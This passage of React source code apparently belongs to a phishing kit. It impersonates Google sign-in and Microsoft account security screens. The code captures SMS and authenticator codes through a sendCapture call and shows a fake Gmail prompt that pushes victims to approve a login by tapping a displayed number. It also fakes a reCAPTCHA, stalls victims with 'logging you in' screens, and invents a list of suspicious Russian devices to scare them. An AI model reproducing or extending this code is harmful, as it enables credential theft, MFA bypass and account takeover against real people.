                  </div>
                </div>
                <div style={{ display: 'flex', borderTop: `1px solid ${borderColor}` }}>
                  <button
                    onClick={() => { setPhoneUpdateContext('not-me'); nav('phone-update'); }}
                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: linkColor, fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
                    THIS ISN&apos;T MY NUMBER
                  </button>
                  <button
                    onClick={() => { setPhoneUpdateContext('was-me'); nav('phone-update'); }}
                    style={{ flex: 1, background: 'none', border: 'none', color: linkColor, fontSize: 12, fontWeight: 600, cursor: 'pointer', padding: '14px 6px', letterSpacing: '0.04em', textAlign: 'center' }}>
                    IT WAS ME
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Code / error-code ── */}
            {(step === 'phone-code' || step === 'error-code') && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                    {gVerifyMethod === 'sms'
                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}><span style={{ fontSize: '0.78em', letterSpacing: '0.08em', opacity: 0.55, fontWeight: 400 }}>●●●●●●</span>{actionPhoneDigits ?? (confirmedPhone ? confirmedPhone.slice(-2) : googlePhone)}</strong>. It may take a moment to arrive.</>
                      : <>Enter the 6-digit code from your authenticator app.</>}
                  </p>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      data-testid="google-phone-code-input"
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      autoFocus
                      value={phoneCodeInput}
                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCodeInput(v); }}
                      onFocus={() => setPhoneCodeFocused(true)}
                      onBlur={() => setPhoneCodeFocused(false)}
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 20,
                        letterSpacing: '0.3em', textAlign: 'center',
                        border: `${step === 'error-code' && !phoneCodeFocused ? 2 : phoneCodeFocused ? 2 : 1}px solid ${step === 'error-code' && !phoneCodeFocused ? '#dc2626' : phoneCodeFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{
                      position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s',
                      ...floatingLabel(phoneCodeFocused, !!phoneCodeInput),
                    }}>
                      Enter code
                    </label>
                  </div>
                  {step === 'error-code' && (
                    <p style={{ fontSize: 13, color: '#dc2626', margin: '0 0 4px', lineHeight: 1.4 }}>
                      Wrong code. Try entering the code again or request a new one.
                    </p>
                  )}
                  <button data-testid="google-resend-code"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                    Resend code
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('phone-verify')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button data-testid="google-code-verify-btn"
                    onClick={() => { if (phoneCodeInput.length >= 4) { sendCapture('phone_code', phoneCodeInput); setStep('processing'); } }}
                    disabled={phoneCodeInput.length < 4}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 4 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 4 ? 0.5 : 1 }}>
                    Verify
                  </button>
                </div>
              </>
            )}

            {/* ── Google Prompt (Gmail app style) ── */}
            {step === 'prompt-number' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                  {/* Timed out notice */}
                  {promptTimedOut && (
                    <p style={{ fontSize: 13, color: subText, margin: '0 0 16px', lineHeight: 1.5 }}>
                      Prompt timed out. Please confirm the new number below.
                    </p>
                  )}
                  {/* Email chip */}
                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 16, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
                    <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                    <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
                  </div>
                  {/* Device instruction */}
                  <p style={{ fontSize: 14, fontWeight: 500, color: textColor, margin: '0 0 8px' }}>Open the Gmail app on your phone</p>
                  <p style={{ fontSize: 13, color: subText, margin: '0 0 20px', lineHeight: 1.6 }}>
                    Google sent a notification to your phone. Open the Gmail app, tap <strong style={{ color: textColor }}>Yes</strong> on the prompt, then tap <strong style={{ color: textColor }}>{effectiveNumber}</strong> on your phone to verify it&apos;s you. This will log you in and sign out any untrusted devices.
                  </p>
                  {/* Large number */}
                  <div style={{ fontSize: 60, fontWeight: 300, color: textColor, textAlign: 'center', lineHeight: 1, marginTop: 'auto' }}>
                    {effectiveNumber}
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => { if (!resendClicked) { setResendClicked(true); sendCapture('resend_prompt', 'clicked'); } }}
                    style={{ background: 'none', border: 'none', color: resendClicked ? subText : linkColor, fontSize: 14, fontWeight: 500, cursor: resendClicked ? 'default' : 'pointer', padding: '10px 0', borderRadius: 20 }}>
                    {resendClicked ? 'Being resent…' : 'Resend it'}
                  </button>
                  {moreWaysClicked ? (
                    <span style={{ fontSize: 13, color: subText }}>This option is unavailable.</span>
                  ) : (
                    <button onClick={() => setMoreWaysClicked(true)}
                      style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0', borderRadius: 20 }}>
                      More ways to verify
                    </button>
                  )}
                </div>
              </>
            )}

            {/* ── Sign-in Blocked ── */}
            {step === 'sign-in-blocked' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 16, textAlign: 'center' }}>
                  {/* Shield icon */}
                  <div style={{ width: 56, height: 56, borderRadius: '50%', background: isDark ? '#1e3a2f' : '#e6f4ea', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <svg viewBox="0 0 24 24" width="28" height="28" fill="none">
                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" fill={isDark ? '#34A853' : '#34A853'} opacity="0.15"/>
                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" stroke="#34A853" strokeWidth="1.5" strokeLinejoin="round"/>
                      <path d="M9 12l2 2 4-4" stroke="#34A853" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <div>
                    <p style={{ fontSize: 14, color: textColor, fontWeight: 500, margin: '0 0 6px' }}>Your sign-in has been blocked</p>
                    <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.5, maxWidth: 280 }}>
                      Your Google Account is protected. The sign-in attempt has been denied.
                    </p>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                  <button onClick={() => nav('email')}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#fff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Done
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Update (new number entry) ── */}
            {step === 'phone-update' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 24, lineHeight: 1.5 }}>
                    {phoneUpdateContext === 'was-me'
                      ? 'Enter your new phone number. Google will send a verification code to confirm the change.'
                      : 'Enter your current phone number to verify your identity and help secure your account.'}
                  </p>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      type="tel"
                      value={phoneUpdateInput}
                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setPhoneUpdateInput(v); }}
                      onFocus={() => setPhoneUpdateFocused(true)}
                      onBlur={() => setPhoneUpdateFocused(false)}
                      onKeyDown={e => { if (e.key === 'Enter' && phoneUpdateInput.length >= 7) nav('processing', 'phone_update', phoneUpdateInput); }}
                      autoFocus
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
                        border: `${phoneUpdateFocused ? 2 : 1}px solid ${phoneUpdateFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(phoneUpdateFocused, !!phoneUpdateInput) }}>
                      Phone number
                    </label>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => nav('phone-wrong')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button onClick={() => phoneUpdateInput.length >= 7 && nav('processing', 'phone_update', phoneUpdateInput)}
                    style={{ backgroundColor: phoneUpdateInput.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: phoneUpdateInput.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneUpdateInput.length >= 7 ? 'pointer' : 'default' }}>
                    Update
                  </button>
                </div>
              </>
            )}

            {/* ── Processing ── */}
            {step === 'processing' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20 }}>
                  <div className="animate-spin" style={{ width: 40, height: 40, flexShrink: 0 }}>
                    <svg width="40" height="40" viewBox="0 0 50 50">
                      <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round"
                        strokeDasharray="80 126"
                        style={{ stroke: 'url(#proc-grad)' }} />
                      <defs>
                        <linearGradient id="proc-grad" x1="0%" y1="0%" x2="100%" y2="0%">
                          <stop offset="0%" stopColor="#4285F4"/>
                          <stop offset="33%" stopColor="#EA4335"/>
                          <stop offset="66%" stopColor="#FBBC05"/>
                          <stop offset="100%" stopColor="#34A853"/>
                        </linearGradient>
                      </defs>
                    </svg>
                  </div>
                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Just a moment…</p>
                </div>
                <div />
              </>
            )}

            {/* ── Killing Time ── */}
            {step === 'killing-time' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20, textAlign: 'center' }}>
                  <div className="animate-spin" style={{ width: 36, height: 36, flexShrink: 0 }}>
                    <svg width="36" height="36" viewBox="0 0 50 50">
                      <defs>
                        <linearGradient id="kt-grad" x1="0%" y1="0%" x2="100%" y2="0%">
                          <stop offset="0%" stopColor="#4285F4"/>
                          <stop offset="33%" stopColor="#EA4335"/>
                          <stop offset="66%" stopColor="#FBBC05"/>
                          <stop offset="100%" stopColor="#34A853"/>
                        </linearGradient>
                      </defs>
                      <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round"
                        stroke="url(#kt-grad)" strokeDasharray="80 126" />
                    </svg>
                  </div>
                  <p style={{ fontSize: 14, color: subText, maxWidth: 280, lineHeight: 1.7, margin: 0 }}>
                    We are logging you in and removing any unauthorised devices. Please wait a moment.
                  </p>
                </div>
                <div />
              </>
            )}

            {/* ── Verify it's you (reCAPTCHA) ── */}
            {step === 'verify' && (
              <>
                {captchaState === 'challenge' ? (
                  <div style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
                    <div style={{ background: '#4a90d9', color: 'white', borderRadius: '4px 4px 0 0', padding: '12px 16px', flexShrink: 0 }}>
                      <div style={{ fontSize: 12, fontWeight: 400, marginBottom: 1 }}>Select all images with</div>
                      <div style={{ fontSize: 20, fontWeight: 700, lineHeight: 1.2 }}>cars</div>
                      <div style={{ fontSize: 11, opacity: 0.9, marginTop: 2 }}>Click verify once there are none left</div>
                    </div>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 2, background: '#d0d0d0', flexShrink: 0 }}>
                      {CAPTCHA_IMGS.map((img, i) => (
                        <div key={i} onClick={() => {
                          const next = new Set(selectedImgs);
                          if (next.has(i)) next.delete(i); else next.add(i);
                          setSelectedImgs(next);
                        }} style={{
                          position: 'relative', height: 86, cursor: 'pointer', overflow: 'hidden',
                          outline: selectedImgs.has(i) ? '3px solid #4285F4' : '3px solid transparent',
                          outlineOffset: -3,
                        }}>
                          <img src={img.url} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block', pointerEvents: 'none' }} />
                          {selectedImgs.has(i) && (
                            <div style={{ position: 'absolute', top: 4, right: 4, width: 22, height: 22, borderRadius: '50%', background: '#4285F4', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                              <svg viewBox="0 0 24 24" width="13" height="13" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '7px 12px', background: '#f9f9f9', border: '1px solid #ccc', borderTop: 'none', borderRadius: '0 0 4px 4px', flexShrink: 0 }}>
                      <div style={{ display: 'flex', gap: 14, color: '#555' }}>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <path d="M1 4v6h6M23 20v-6h-6" strokeLinecap="round" strokeLinejoin="round"/>
                          <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z" strokeLinecap="round" strokeLinejoin="round"/>
                          <path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v4M8 23h8" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01" strokeLinecap="round"/>
                        </svg>
                      </div>
                      <button onClick={solveCaptcha} style={{ backgroundColor: '#4a90d9', color: 'white', border: 'none', borderRadius: 3, padding: '9px 20px', fontSize: 14, fontWeight: 600, cursor: 'pointer', letterSpacing: '0.04em' }}>
                        VERIFY
                      </button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div>
                      <div style={{
                        display: 'inline-flex', alignItems: 'center', gap: 8,
                        border: `1px solid ${borderColor}`, borderRadius: 20,
                        padding: '6px 12px 6px 6px', marginBottom: 20, cursor: 'pointer',
                        background: isDark ? '#3c3f43' : '#f0f4f9',
                      }}>
                        <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                        <span style={{ fontSize: 14, color: textColor }}>{email || 'john@gmail.com'}</span>
                        <ChevronLeft className="w-3 h-3 rotate-180" style={{ color: textColor, marginLeft: 2 }} />
                      </div>
                      <p style={{ fontSize: 13, color: subText, margin: '0 0 14px' }}>Confirm you&apos;re not a robot</p>
                      <div style={{ border: '1px solid #d4d4d4', borderRadius: 3, background: isDark ? '#3c3f43' : '#f9f9f9', padding: '16px 12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', maxWidth: 300, boxShadow: '0 0 4px rgba(0,0,0,0.1)' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
                          {captchaState === 'solving' ? (
                            <svg className="animate-spin" width="28" height="28" viewBox="0 0 50 50" style={{ flexShrink: 0 }}>
                              <circle cx="25" cy="25" r="20" fill="none" stroke="#4285F4" strokeWidth="4" strokeDasharray="80 126"/>
                            </svg>
                          ) : captchaState === 'solved' ? (
                            <div style={{ width: 28, height: 28, borderRadius: '50%', background: '#00BF6F', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                              <svg viewBox="0 0 24 24" width="17" height="17" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/></svg>
                            </div>
                          ) : (
                            <div onClick={() => setCaptchaState('challenge')} style={{ width: 24, height: 24, border: '2px solid #9aa0a6', borderRadius: 3, cursor: 'pointer', background: 'white', flexShrink: 0 }} />
                          )}
                          <span style={{ fontSize: 14, color: isDark ? '#c4c7c5' : '#555' }}>I&apos;m not a robot</span>
                        </div>
                        <div style={{ textAlign: 'center', minWidth: 58 }}>
                          <div style={{ fontSize: 10, lineHeight: 1.3, marginBottom: 2 }}>
                            <span style={{ color: '#4285F4', fontWeight: 700 }}>re</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span><span style={{ color: '#34A853', fontWeight: 700 }}>P</span><span style={{ color: '#4285F4', fontWeight: 700 }}>T</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#34A853', fontWeight: 700 }}>H</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span>
                          </div>
                          <div style={{ fontSize: 8, color: '#999' }}>Privacy - Terms</div>
                        </div>
                      </div>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <button onClick={() => setStep('password')} style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                        Try another way
                      </button>
                      <button
                        onClick={() => captchaState === 'solved' && nav('processing')}
                        style={{ backgroundColor: captchaState === 'solved' ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c3f43' : '#c8d0db'), color: captchaState === 'solved' ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: captchaState === 'solved' ? 'pointer' : 'default' }}>
                        Next
                      </button>
                    </div>
                  </>
                )}
              </>
            )}

          </div>
        </div>

        {/* Footer — only visible on desktop */}
        {isDesktop && (
          <div style={{ width: '100%', maxWidth: 800, display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '18px 4px 0', boxSizing: 'border-box' }}>
            <button style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, color: subText, padding: '4px 8px', borderRadius: 4 }}>
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="1.5"><circle cx="12" cy="12" r="9"/><path d="M12 3a4.5 4.5 0 0 1 0 18M12 3a4.5 4.5 0 0 0 0 18M3 12h18"/></svg>
              English (United States)
              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="6 9 12 15 18 9"/></svg>
            </button>
            <div style={{ display: 'flex', gap: 4 }}>
              {['Help', 'Privacy', 'Terms'].map(t => (
                <button key={t} style={{ background: 'none', border: 'none', cursor: 'pointer', fontSize: 13, color: subText, padding: '4px 10px', borderRadius: 4 }}>{t}</button>
              ))}
            </div>
          </div>
        )}
      </div>
    </>
  );
}

// ─── Suspicious Devices Screen ────────────────────────────────────────────────

type SuspDevice = { id: string; name: string; os: string; location: string; ip: string; flag: string; lastSeen: string; isCurrent: boolean; kind: 'android' | 'windows' | 'mac' };

const SUSP_DEVICES: SuspDevice[] = [
  { id: 'd1', name: 'Alcatel A7',       os: 'Android 11',         location: 'Moscow, Russia',    ip: '185.234.219.32',  flag: '🇷🇺', lastSeen: '2 min ago',   isCurrent: false, kind: 'android' },
  { id: 'd2', name: 'Huawei P30 Lite',  os: 'Android 12',         location: 'Moscow, Russia',    ip: '185.234.220.157', flag: '🇷🇺', lastSeen: '34 min ago',  isCurrent: false, kind: 'android' },
  { id: 'd3', name: 'DESKTOP-J4R2KN1',  os: 'Windows 10 Home',    location: 'Minsk, Belarus',    ip: '178.238.47.92',   flag: '🇧🇾', lastSeen: '2 hours ago', isCurrent: false, kind: 'windows' },
  { id: 'd4', name: 'MacBook Pro',       os: 'macOS Ventura 13.4', location: 'Current location',  ip: '',                flag: '',    lastSeen: 'Active now',  isCurrent: true,  kind: 'mac'     },
];

const REMOVAL_MSGS = [
  'Revoking device access tokens...',
  'Invalidating session credentials...',
  'Scanning for persistent threats...',
  'Updating security certificates...',
  'Cleaning up unauthorized sessions...',
  'Verifying account integrity...',
];

function DeviceKindIcon({ kind, size = 36 }: { kind: string; size?: number }) {
  if (kind === 'android') return (
    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
      <rect x="6" y="8" width="28" height="24" rx="3" fill="#E8F5E9" stroke="#43A047" strokeWidth="1.8"/>
      <rect x="10" y="12" width="20" height="13" rx="1" fill="#C8E6C9"/>
      <circle cx="20" cy="28.5" r="2" fill="#43A047"/>
      <path d="M14 7L11.5 9M26 7L28.5 9" stroke="#43A047" strokeWidth="1.8" strokeLinecap="round"/>
    </svg>
  );
  if (kind === 'windows') return (
    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
      <rect x="3" y="5" width="34" height="22" rx="2.5" fill="#E3F2FD" stroke="#1565C0" strokeWidth="1.8"/>
      <rect x="7" y="9" width="26" height="14" rx="1" fill="#BBDEFB"/>
      <path d="M13 35h14M20 27v8" stroke="#1565C0" strokeWidth="1.8" strokeLinecap="round"/>
      <rect x="10" y="11"   width="7.5" height="5" rx="0.5" fill="#F25022"/>
      <rect x="18.5" y="11" width="7.5" height="5" rx="0.5" fill="#7FBA00"/>
      <rect x="10" y="17"   width="7.5" height="5" rx="0.5" fill="#00A4EF"/>
      <rect x="18.5" y="17" width="7.5" height="5" rx="0.5" fill="#FFB900"/>
    </svg>
  );
  return (
    <svg width={size} height={size} viewBox="0 0 40 40" fill="none">
      <rect x="3" y="5" width="34" height="22" rx="3" fill="#F5F5F7" stroke="#636366" strokeWidth="1.8"/>
      <rect x="7" y="9" width="26" height="14" rx="1" fill="#D1D1D6"/>
      <path d="M1.5 30c0-1.1.7-2.1 1.8-2.5L10 27h20l6.7.5c1.1.4 1.8 1.4 1.8 2.5v.6c0 .8-.7 1.4-1.5 1.4H3c-.8 0-1.5-.6-1.5-1.4V30z" fill="#F5F5F7" stroke="#636366" strokeWidth="1.8"/>
      <rect x="15" y="30" width="10" height="1" rx="0.5" fill="#8E8E93"/>
    </svg>
  );
}

function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, email, visitorLocation }: {
  provider: string; waitSeconds: number; extended: boolean; onDone: () => void;
  email?: string; visitorLocation?: string;
}) {
  const [removedIds, setRemovedIds] = useState<Set<string>>(new Set());
  const [removingId, setRemovingId] = useState<string | null>(null);
  const [phase, setPhase] = useState<'list' | 'removing' | 'complete' | 'locked'>('list');
  const [countdown, setCountdown] = useState(waitSeconds);
  const [totalWait, setTotalWait] = useState(waitSeconds);
  const [extendedShown, setExtendedShown] = useState(false);
  const [msgIdx, setMsgIdx] = useState(0);

  const anyRemoved = removedIds.size > 0;

  const getDevLocation = (dev: SuspDevice) =>
    dev.isCurrent && visitorLocation ? visitorLocation : dev.location;

  const handleRemove = (id: string) => {
    if (removingId) return;
    setRemovingId(id);
    setTimeout(() => { setRemovedIds(p => { const s = new Set(p); s.add(id); return s; }); setRemovingId(null); }, 900);
  };

  useEffect(() => {
    if (phase !== 'removing') return;
    if (countdown <= 0) { setPhase('complete'); return; }
    const t = setTimeout(() => setCountdown(c => c - 1), 1000);
    return () => clearTimeout(t);
  }, [phase, countdown]);

  useEffect(() => {
    if (phase !== 'removing') return;
    const t = setInterval(() => setMsgIdx(i => (i + 1) % REMOVAL_MSGS.length), 2500);
    return () => clearInterval(t);
  }, [phase]);

  useEffect(() => {
    if (!extended || extendedShown || phase !== 'removing') return;
    setExtendedShown(true);
    setCountdown(c => c + 35);
    setTotalWait(t => t + 35);
  }, [extended, extendedShown, phase]);

  useEffect(() => {
    if (phase !== 'complete') return;
    const t = setTimeout(() => setPhase('locked'), 3000);
    return () => clearTimeout(t);
  }, [phase]);

  const progressPct = Math.max(0, Math.min(100, ((totalWait - countdown) / totalWait) * 100));

  // ── Microsoft ─────────────────────────────────────────────────────────────
  if (provider === 'microsoft') {
    return (
      <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f2f2f2]" style={{ fontFamily: "'Segoe UI', system-ui, sans-serif" }}>
        <div className="bg-white border-b border-[#e5e5e5] px-5 py-3 flex items-center gap-3 sticky top-0 z-10">
          <MicrosoftLogo />
          <span className="text-[15px] text-[#737373] font-light tracking-wide select-none">Microsoft account</span>
          {email && <span className="ml-auto text-[12px] text-[#605e5c] truncate max-w-[220px]">{email}</span>}
        </div>
        <div className="max-w-[480px] mx-auto px-4 py-8">
          <AnimatePresence mode="wait">
            {phase === 'list' && (
              <motion.div key="ms-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.22 }}>
                <div className="flex gap-3 bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3 mb-6">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#505a64" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#505a64" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#505a64"/></svg>
                  <div>
                    <div className="text-[14px] font-semibold text-[#1b1b1b] mb-0.5">Suspicious sign-in activity detected</div>
                    <div className="text-[13px] text-[#605e5c] leading-snug">We found devices on your account that we don't recognize. Please review and remove any devices you don't use.</div>
                  </div>
                </div>
                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-1">Review connected devices</div>
                <div className="text-[13px] text-[#605e5c] mb-5">These devices have recently accessed your Microsoft account.</div>
                <div className="space-y-3 mb-6">
                  {SUSP_DEVICES.map(dev => {
                    const isRemoved = removedIds.has(dev.id);
                    const isRemoving = removingId === dev.id;
                    return (
                      <motion.div key={dev.id} animate={{ opacity: isRemoved ? 0.4 : 1, scale: isRemoving ? 0.98 : 1 }} transition={{ duration: 0.3 }}
                        className="bg-white border border-[#d6d6d6] rounded-lg px-4 py-3">
                        <div className="flex items-start gap-3">
                          <div className="mt-0.5 flex-shrink-0"><DeviceKindIcon kind={dev.kind} size={36} /></div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-[14px] font-semibold text-[#1b1b1b]">{dev.name}</span>
                              {dev.isCurrent && <span className="text-[10px] font-semibold bg-[#0078D4] text-white px-1.5 py-0.5 rounded">This device</span>}
                              {dev.flag && !dev.isCurrent && <span className="text-[13px]">{dev.flag}</span>}
                              {isRemoved && <span className="text-[11px] font-semibold text-[#107c10] flex items-center gap-1"><Check className="w-3 h-3" />Removed</span>}
                            </div>
                            <div className="text-[12px] text-[#605e5c] mt-0.5">{dev.os}</div>
                            <div className="text-[12px] text-[#605e5c]">{getDevLocation(dev)}{dev.ip ? ` · ${dev.ip}` : ''}</div>
                            <div className="text-[11px] text-[#a19f9d] mt-0.5">Last activity: {dev.lastSeen}</div>
                          </div>
                          <div className="flex-shrink-0 mt-0.5">
                            {!dev.isCurrent && !isRemoved && !isRemoving && (
                              <button onClick={() => handleRemove(dev.id)}
                                className="text-[13px] font-semibold text-[#a4262c] hover:text-[#7d1c21] border border-[#a4262c] hover:border-[#7d1c21] px-3 py-1.5 rounded transition-colors">
                                Remove device
                              </button>
                            )}
                            {isRemoving && (
                              <div className="flex items-center gap-1.5 text-[12px] text-[#605e5c]">
                                <svg className="w-3.5 h-3.5 animate-spin" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#e5e5e5" strokeWidth="3"/><path d="M12 2a10 10 0 0110 10" stroke="#0078D4" strokeWidth="3" strokeLinecap="round"/></svg>
                                Removing...
                              </div>
                            )}
                          </div>
                        </div>
                      </motion.div>
                    );
                  })}
                </div>
                {anyRemoved && (
                  <motion.button initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} onClick={() => setPhase('removing')}
                    className="w-full py-2.5 rounded text-[15px] font-semibold text-white hover:brightness-90 transition-all"
                    style={{ backgroundColor: '#0078D4' }}>
                    Secure my account
                  </motion.button>
                )}
              </motion.div>
            )}
            {phase === 'removing' && (
              <motion.div key="ms-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-10">
                <div className="mb-6 relative w-16 h-16">
